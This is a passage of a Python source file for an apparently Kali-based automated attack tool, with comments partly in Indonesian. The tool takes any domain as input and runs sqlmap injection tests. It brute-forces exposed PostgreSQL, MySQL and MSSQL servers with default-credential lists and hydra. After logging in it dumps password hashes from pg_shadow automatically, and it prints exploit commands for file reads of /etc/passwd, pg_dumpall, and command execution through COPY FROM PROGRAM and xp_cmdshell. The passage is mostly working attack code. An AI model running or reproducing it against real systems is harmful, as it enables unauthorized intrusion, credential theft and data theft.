    if tools.get("sqlmap") and sql_params:
        print(f"\n  {c('[+] SQLMap Injection Test', G)}")
        for p in sql_params[:3]:
            print(f"    Testing param: {c(p, W)}")
            stdout, _, ok = run_cmd(
                f"sqlmap -u '{url}?{p}=1' --batch --level 2 --risk 1 "
                f"--output-dir={RESULTS_DIR}/sqlmap 2>/dev/null",
                180, f"sqlmap testing parameter: {p}"
            )
            if stdout and ("vulnerable" in stdout.lower() or "identified" in stdout.lower()):
                # Extract injection details
                for line in stdout.split('\n'):
                    if "Parameter:" in line and "GET" in line:
                        REPORT["vulnerabilities"].append({
                            "url": f"{url}?{p}=1", "name": f"SQL Injection ({p})",
                            "severity": "CRITICAL",
                            "detail": line.strip(),
                            "exploit_cmd": f"sqlmap -u '{url}?{p}=1' --batch --dbs"
                        })
                        print(f"    {c(f'  ⚡ SQLi FOUND on param: {p}!', R)}")
                        sqli_url = f"{url}?{p}=1"
                        print(f"    {c(f'  → sqlmap -u {sqli_url} --dbs', Y)}")


# ============ PHASE 5: REPORTING ============

def generate_summary():
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 5: EXPLOITATION & SUMMARY', BOLD)}")
    print(f"{c('='*65, Y)}")

    # Count severities
    for v in REPORT["vulnerabilities"]:
        s = v.get("severity", "INFO").upper()
        if s in REPORT["summary"]:
            REPORT["summary"][s] += 1
        REPORT["summary"]["total"] += 1

    # Summary stats
    vulns = REPORT["vulnerabilities"]
    total = len(vulns)
    crit = REPORT["summary"]["critical"]
    high = REPORT["summary"]["high"]
    med = REPORT["summary"]["medium"]
    low = REPORT["summary"]["low"]
    info = REPORT["summary"]["info"]

    print(f"""\n  {c('╔════════════════════════════════════════════════════╗', Y)}
  {c('║', Y)}  {c('📊 SCAN SUMMARY', BOLD)}                          {c('║', Y)}
  {c('╠════════════════════════════════════════════════════╣', Y)}
  {c('║', Y)}  Target:    {c(REPORT['target'], W)}                    {c('║', Y)}
  {c('║', Y)}  Total:     {c(str(total), W)} vulns {' ' * (25-len(str(total)))} {c('║', Y)}
  {c('║', Y)}  Critical:  {c(str(crit), R)}                             {c('║', Y)}
  {c('║', Y)}  High:      {c(str(high), R)}                             {c('║', Y)}
  {c('║', Y)}  Medium:    {c(str(med), Y)}                             {c('║', Y)}
  {c('║', Y)}  Low:       {c(str(low), B)}                             {c('║', Y)}
  {c('╚════════════════════════════════════════════════════╝', Y)}""")

    # Show exploitation table for ALL findings
    if vulns:
        print(f"\n  {c('[⚡] EXPLOITATION PAYLOADS', R)}{c(' — Kirim ke URL yang rentan', Y)}")
        print(f"  {c('─'*65, DIM)}")

        # Group by severity
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            sev_vulns = [v for v in vulns if v.get("severity", "INFO").upper() == sev]
            if not sev_vulns:
                continue
            color = SEVERITY_COLORS.get(sev, W)
            exploit_rows = []
            for v in sev_vulns:
                vuln_url = v.get("url", "")
                vuln_name = v.get("name", "Unknown")
                exploit = v.get("exploit_cmd", "# No exploit available")
                exploit_rows.append([
                    c(vuln_name[:45], color),
                    c(vuln_url[:60], W),
                    c(exploit[:60], DIM)
                ])
            print_table(["Vulnerability", "Vulnerable URL", "Exploit Command"],
                       exploit_rows, f"[{sev} EXPLOITS]")

    # Direct curl commands for each finding
    print(f"\n  {c('[⚡] DIRECT CURL EXPLOIT COMMANDS', R)}")
    print(f"  {c('─'*65, DIM)}")
    for v in vulns[:10]:
        sev = v.get("severity", "INFO").upper()
        color = SEVERITY_COLORS.get(sev, W)
        if sev in ["CRITICAL", "HIGH"]:
            vname = v.get("name", "Unknown")[:55]
            vurl = v.get("url", "")
            vcmd = v.get("exploit_cmd", "N/A")[:100]
            print(f"  {c(f'[{sev}]', color)} {c(vname, W)}")
            print(f"        {c('URL:', DIM)} {c(vurl, G)}")
            print(f"        {c('CMD:', DIM)} {c(vcmd, Y)}")
            print()

    # Save JSON report
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = RESULTS_DIR / f"kali_report_{REPORT['target'].replace('.', '_')}_{timestamp}.json"
    with open(json_file, 'w') as f:
        json.dump(REPORT, f, indent=2, default=str)
    print(f"\n  {c(f'📄 JSON Report: {json_file}', G)}")


# ============ PHASE 4b: DATABASE EXPLOITATION ============

PHASE4B_RAN = False

def phase_db_scan(target, tools):
    """Scan dan exploit database services (PostgreSQL, MySQL, MSSQL) yang terbuka."""
    global PHASE4B_RAN
    PHASE4B_RAN = True

    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 4b: DATABASE EXPLOITATION', BOLD)}")
    print(f"  {c('  PostgreSQL / MySQL / MSSQL — Default creds + Brute Force', DIM)}")
    print(f"{c('='*65, Y)}")

    domain = target.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
    results = []

    # Check which ports are open from nmap results
    open_ports = REPORT.get("open_ports", [])
    has_pgsql = any("5432" in p for p in open_ports)
    has_mysql = any("3306" in p for p in open_ports)
    has_mssql = any("1433" in p for p in open_ports)

    # Also check manually via socket
    import socket as socklib
    for db_port, db_name in [(5432, "PostgreSQL"), (3306, "MySQL"), (1433, "MSSQL")]:
        try:
            s = socklib.socket()
            s.settimeout(2)
            s.connect((domain, db_port))
            s.close()
            if db_name == "PostgreSQL": has_pgsql = True
            elif db_name == "MySQL": has_mysql = True
            elif db_name == "MSSQL": has_mssql = True
        except:
            pass

    # ---------- PostgreSQL ----------
    if has_pgsql:
        print(f"\n  {c('[!] PostgreSQL (port 5432) TERBUKA!', R)}")
        print(f"  {c('  Target: postgresql://{domain}:5432', Y)}")
        REPORT["vulnerabilities"].append({
            "url": f"postgresql://{domain}:5432",
            "name": "PostgreSQL Exposed to Public Internet",
            "severity": "CRITICAL",
            "detail": "Port 5432 terbuka untuk umum dengan user postgres superuser",
            "exploit_cmd": f"psql -h {domain} -p 5432 -U postgres"
        })

        # Default credentials test
        print(f"\n  {c('[+] Testing PostgreSQL Default Credentials', G)}")
        pg_creds = [
            ("postgres", "postgres"), ("postgres", "admin"), ("postgres", "root"),
            ("postgres", "password"), ("postgres", "123456"), ("postgres", "postgresql"),
            ("postgres", "admin123"), ("postgres", "P@ssw0rd"), ("postgres", ""),
            ("admin", "admin"), ("admin", "postgres"), ("root", "root"),
            ("root", "postgres"), ("postgres", "changeme"), ("postgres", "pass"),
        ]

        found_creds = None
        for user, pwd in pg_creds:
            try:
                stdout, stderr, ok = run_cmd(
                    f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -c 'SELECT 1' -t 2>/dev/null",
                    10, ""
                )
                if ok or "Welcome to psql" in stdout or "SELECT 1" in stdout.replace('\n','').strip():
                    found_creds = (user, pwd)
                    print(f"    {c(f'✓ LOGIN BERHASIL: {user}:{pwd}', G)}")
                    break
                # Check for specific PostgreSQL auth errors
                if "password authentication failed" in stderr.lower():
                    continue
                if "no password" in stderr.lower():
                    continue
            except: pass

        # Try with hydra if available for more thorough testing
        if tools.get("hydra"):
            print(f"\n  {c('[+] Hydra PostgreSQL Brute Force', G)}")
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if not Path(wordlist).exists():
                wordlist = "/usr/share/wordlists/fasttrack.txt"
            if Path(wordlist).exists():
                stdout, _, _ = run_cmd(
                    f"hydra -l postgres -P {wordlist} {domain} -s 5432 postgres -t 4 -o {RESULTS_DIR}/hydra_pg.txt 2>/dev/null",
                    120, "hydra brute forcing postgres password"
                )
                if stdout:
                    for line in stdout.split('\n'):
                        if "password:" in line.lower() or "login:" in line.lower():
                            m = re.search(r'password:\s*(\S+)', line)
                            if m:
                                found_creds = ("postgres", m.group(1))
                                print(f"    {c(f'✓ HYDRA FOUND: postgres:{m.group(1)}', G)}")

        if found_creds:
            user, pwd = found_creds
            print(f"\n  {c('╔═══════════════════════════════════════╗', G)}")
            print(f"  {c('║', G)}  {c('✅ POSTGRESQL ACCESS GRANTED!', BOLD)}      {c('║', G)}")
            print(f"  {c('║', G)}  {c(f'Host: {domain}:5432', W)}          {c('║', G)}")
            print(f"  {c('║', G)}  {c(f'User: {user}', W)}                   {c('║', G)}")
            print(f"  {c('║', G)}  {c(f'Pass: {pwd}', W)}                   {c('║', G)}")
            print(f"  {c('╚═══════════════════════════════════════╝', G)}")

            REPORT["vulnerabilities"].append({
                "url": f"postgresql://{domain}:5432",
                "name": f"PostgreSQL Default/Weak Credentials: {user}:{pwd}",
                "severity": "CRITICAL",
                "detail": f"Login berhasil dengan credential {user}:{pwd}",
                "exploit_cmd": f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres"
            })

            # Auto-exploit: dump database info
            print(f"\n  {c('[+] Auto-Enumerating PostgreSQL...', G)}")
            cmds = [
                ("Databases", "SELECT datname FROM pg_database WHERE datistemplate=false;"),
                ("Users", "SELECT usename, passwd FROM pg_shadow;"),
                ("Tables (postgres)", "SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') LIMIT 20;"),
                ("Current User", "SELECT current_user, inet_server_addr(), inet_server_port();"),
                ("Version", "SELECT version();"),
                ("Superuser", "SELECT usename FROM pg_user WHERE usesuper=true;"),
                ("PGP Keys", "SELECT * FROM pg_user WHERE usename='postgres';"),
            ]
            for label, sql in cmds:
                stdout, _, ok = run_cmd(
                    f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres -c \"{sql}\" 2>/dev/null",
                    15, f"executing: {label}"
                )
                if stdout:
                    lines = [l for l in stdout.split('\n') if l.strip() and 'rows' not in l.lower() and '---' not in l]
                    if lines:
                        print(f"\n    {c(f'[{label}]', C)}")
                        for line in lines[:8]:
                            print(f"    {line.strip()}")
                        if len(lines) > 8:
                            print(f"    {c('... (truncated)', DIM)}")
        else:
            print(f"\n  {c('  ✗ Default credentials failed. Try manual brute force:', Y)}")
            print(f"    {c(f'hydra -l postgres -P /usr/share/wordlists/rockyou.txt {domain} -s 5432 postgres -t 4', DIM)}")
            print(f"    {c(f'metasploit: use auxiliary/scanner/postgres/postgres_login', DIM)}")

        # PostgreSQL exploitation commands regardless
        print(f"\n  {c('[⚡] PostgreSQL Exploit Commands:', R)}")
        exploits = [
            f"# 1. Brute force with hydra",
            f"hydra -l postgres -P /usr/share/wordlists/rockyou.txt {domain} -s 5432 postgres -t 4",
            f"",
            f"# 2. Metasploit scanner",
            f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {domain}; set STOP_ON_SUCCESS true; run'",
            f"",
            f"# 3. Connect jika dapat password",
            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -d postgres",
            f"",
            f"# 4. Dump all databases",
            f"PGPASSWORD='PASSWORD' pg_dumpall -h {domain} -p 5432 -U postgres > dump.sql",
            f"",
            f"# 5. File read (superuser)",
            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -c \"COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;\"",
            f"",
            f"# 6. Command execution (CVE-2019-9193)",
            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -c 'DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \\\"id\\\"; SELECT * FROM cmd_exec;'",
            f"",
            f"# 7. Metasploit postgres exploitation",
            f"msfconsole -q -x 'use auxiliary/admin/postgres/postgres_sql; set RHOSTS {domain}; set PASSWORD PASSWORD; set DATABASE postgres; run'",
        ]
        for line in exploits:
            print(f"    {c(line, DIM)}")

    # ---------- MySQL ----------
    if has_mysql:
        print(f"\n  {c('[!] MySQL (port 3306) TERBUKA!', R)}")
        REPORT["vulnerabilities"].append({
            "url": f"mysql://{domain}:3306",
            "name": "MySQL Exposed to Public Internet",
            "severity": "CRITICAL",
            "detail": "Port 3306 terbuka untuk umum",
            "exploit_cmd": f"mysql -h {domain} -u root -p"
        })

        print(f"\n  {c('[+] Testing MySQL Default Credentials', G)}")
        mysql_creds = [
            ("root", ""), ("root", "root"), ("root", "admin"), ("root", "password"),
            ("root", "123456"), ("root", "P@ssw0rd"), ("root", "mysql"),
            ("admin", "admin"), ("admin", "password"),
        ]
        mysql_found = None
        for user, pwd in mysql_creds:
            try:
                stdout, stderr, ok = run_cmd(
                    f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT 1' -s 2>/dev/null",
                    10, ""
                )
                if ok or "1" in stdout.strip():
                    mysql_found = (user, pwd)
                    print(f"    {c(f'✓ LOGIN BERHASIL: {user}:{pwd}', G)}")
                    break
            except: pass

        if mysql_found:
            user, pwd = mysql_found
            print(f"\n  {c('╔═══════════════════════════════════════╗', G)}")
            print(f"  {c('║', G)}  {c('✅ MYSQL ACCESS GRANTED!', BOLD)}            {c('║', G)}")
            print(f"  {c('║', G)}  {c(f'Host: {domain}:3306', W)}           {c('║', G)}")
            print(f"  {c('║', G)}  {c(f'User: {user}', W)}                    {c('║', G)}")
            print(f"  {c('╚═══════════════════════════════════════╝', G)}")

            REPORT["vulnerabilities"].append({
                "url": f"mysql://{domain}:3306",
                "name": f"MySQL Default Credentials: {user}:{pwd}",
                "severity": "CRITICAL",
                "detail": f"Login berhasil dengan credential {user}:{pwd}",
                "exploit_cmd": f"mysql -h {domain} -u {user} -p'{pwd}'"
            })

        print(f"\n  {c('[⚡] MySQL Exploit Commands:', R)}")
        mysql_exploits = [
            f"# 1. Brute force with hydra",
            f"hydra -l root -P /usr/share/wordlists/rockyou.txt {domain} -s 3306 mysql",
            f"",
            f"# 2. Connect (root:empty password)",
            f"mysql -h {domain} -u root",
            f"",
            f"# 3. Dump all databases",
            f"mysql -h {domain} -u root -p'PASSWORD' -e 'SELECT schema_name FROM information_schema.schemata;'",
            f"",
            f"# 4. File read (if secure_file_priv enabled)",
            f"mysql -h {domain} -u root -p'PASSWORD' -e \"SELECT LOAD_FILE('/etc/passwd');\"",
            f"",
            f"# 5. Metasploit scanner",
            f"msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS {domain}; set STOP_ON_SUCCESS true; run'",
        ]
        for line in mysql_exploits:
            print(f"    {c(line, DIM)}")

    # ---------- MSSQL ----------
    if has_mssql:
        print(f"\n  {c('[!] MSSQL (port 1433) TERBUKA!', R)}")
        REPORT["vulnerabilities"].append({
            "url": f"mssql://{domain}:1433",
            "name": "MSSQL Exposed to Public Internet",
            "severity": "CRITICAL",
            "detail": "Port 1433 terbuka untuk umum",
            "exploit_cmd": f"sqsh -S {domain} -U sa -P password"
        })
        print(f"\n  {c('[⚡] MSSQL Exploit Commands:', R)}")
        mssql_exploits = [
            f"# 1. Brute force with hydra",
            f"hydra -l sa -P /usr/share/wordlists/rockyou.txt {domain} -s 1433 mssql",
            f"",
            f"# 2. Connect with sqsh",
            f"sqsh -S {domain} -U sa -P 'PASSWORD'",
            f"",
            f"# 3. Metasploit scanner",
            f"msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_login; set RHOSTS {domain}; run'",
            f"",
            f"# 4. xp_cmdshell (RCE jika sa)",
            f"msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {domain}; set CMD whoami; run'",
        ]
        for line in mssql_exploits:
            print(f"    {c(line, DIM)}")

    if not (has_pgsql or has_mysql or has_mssql):
        print(f"\n  {c('  ✓ No public database services detected', G)}")

    return results


# ============ MAIN ============

def main():
    banner()
    RESULTS_DIR.mkdir(exist_ok=True)

    target = input(f"\n  {c('Target (domain or URL)', C)}: ").strip()
    if not target:
        return

    # Clean target
    domain = target.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
    REPORT["target"] = domain
    REPORT["timestamp"] = datetime.datetime.now().isoformat()

    print(f"\n  {c(f'Target: {domain}', W)}")
    print(f"  {c(f'Results dir: {RESULTS_DIR}', DIM)}")

    tools = phase_recon(domain)
    phase_directories(domain, tools)
    phase_parameters(domain, tools)
    phase_params_advanced(domain, tools)
    phase_vuln_scan(domain, tools)
    phase_db_scan(domain, tools)
    generate_summary()

    print(f"\n  {c('✅ Scan complete!', G)}")
    print(f"  {c(f'Results saved to {RESULTS_DIR}/', DIM)}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {c('[!] Interrupted by user', Y)}")
        sys.exit(0)
    except Exception as e:
        print(f"\n  {c(f'[!] Error: {e}', R)}")
        import traceback; traceback.print_exc()
        sys.exit(1)
